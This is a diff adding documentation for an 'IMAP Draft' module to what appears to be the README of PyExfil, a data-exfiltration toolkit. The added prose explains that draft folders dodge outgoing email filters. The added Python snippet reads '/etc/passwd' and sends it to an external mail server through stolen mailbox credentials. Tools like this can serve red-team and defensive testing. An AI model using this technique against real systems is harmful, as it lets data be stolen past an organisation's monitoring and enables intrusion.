@@ -342,6 +342,18 @@ for i in b.packets:
 print(a.Build())
 ```
 
+#### IMAP Draft
+This particular module is extremely useful when the organization is using IMAP mailboxes with email filtering. The general concept is that email filtering is applied on outgoing (and sometimes) incoming emails. However, these filters are generally no applied to Draft folders since these are not yet in transit.
+
+In a case where you have obtained a foothold on such a machine, by extracting the credentials you can access the mailbox associated with the account from outside the organization's corporate network.
+
+```python
+from pyexfil.network.Draft import Send, Broker
+
+a = Send(file_path='/etc/passwd', server_addr='mail.MoriRT.com', server_creds=('MAILBOX@HOST.com','PASSWORD!'), key='DEFAULT')
+check = a.Exfiltrate()
+print(check) # Boolean
+```
 
 ### Communication
 
